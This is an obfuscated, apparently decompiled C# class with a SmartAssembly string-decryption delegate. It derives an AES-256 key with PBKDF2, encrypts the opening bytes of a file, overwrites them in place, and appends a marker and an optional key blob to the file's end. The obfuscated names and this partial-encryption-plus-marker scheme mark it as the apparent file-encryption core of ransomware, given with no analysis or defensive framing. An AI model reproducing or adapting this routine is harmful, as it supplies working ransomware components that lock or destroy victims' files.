using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

public static class jNSEdZYoBdBdhxmH
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] xvlvoUCxjQYUr(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = xSqzCBSCkuRrLP(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes xSqzCBSCkuRrLP(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] VfdLPRMCiCJnTgGS(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (sjdJQieILoWa.fjTNcifXIFVhG == getString_0(107396914))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception)
		{
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void WUzJtkzHTRDzhk(string kohaVuNmidrN, byte[] JzaqBrSHCcSsf, byte[] yRqiJYcnPvQa = null)
	{
		try
		{
			byte[] array = null;
			if (sjdJQieILoWa.fjTNcifXIFVhG == getString_0(107396914))
			{
				array = (sjdJQieILoWa.IFSnWiZXyf ? Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258))) : Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(kohaVuNmidrN, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(JzaqBrSHCcSsf, 0, JzaqBrSHCcSsf.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(kohaVuNmidrN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!sjdJQieILoWa.IFSnWiZXyf)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(yRqiJYcnPvQa, 0, yRqiJYcnPvQa.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (sjdJQieILoWa.IFSnWiZXyf ? Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258))) : Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299))));
			FileStream fileStream2 = new FileStream(kohaVuNmidrN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(JzaqBrSHCcSsf, 0, JzaqBrSHCcSsf.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(kohaVuNmidrN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!sjdJQieILoWa.IFSnWiZXyf)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(yRqiJYcnPvQa, 0, yRqiJYcnPvQa.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
			byte[] array2 = null;
			array2 = (sjdJQieILoWa.IFSnWiZXyf ? Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410258))) : Encoding.ASCII.GetBytes(sjdJQieILoWa.HaBpHuAelnemsPrlU(sjdJQieILoWa.hJIliGmLQLK) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299)) + Convert.ToString(sjdJQieILoWa.CqCuqTxSfTnQ) + sjdJQieILoWa.HaBpHuAelnemsPrlU(getString_0(107410299))));
			FileStream fileStream4 = new FileStream(kohaVuNmidrN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(JzaqBrSHCcSsf, 0, JzaqBrSHCcSsf.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(kohaVuNmidrN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!sjdJQieILoWa.IFSnWiZXyf)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(yRqiJYcnPvQa, 0, yRqiJYcnPvQa.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static jNSEdZYoBdBdhxmH()
	{
		Strings.CreateGetStringDelegate(typeof(jNSEdZYoBdBdhxmH));
	}
}
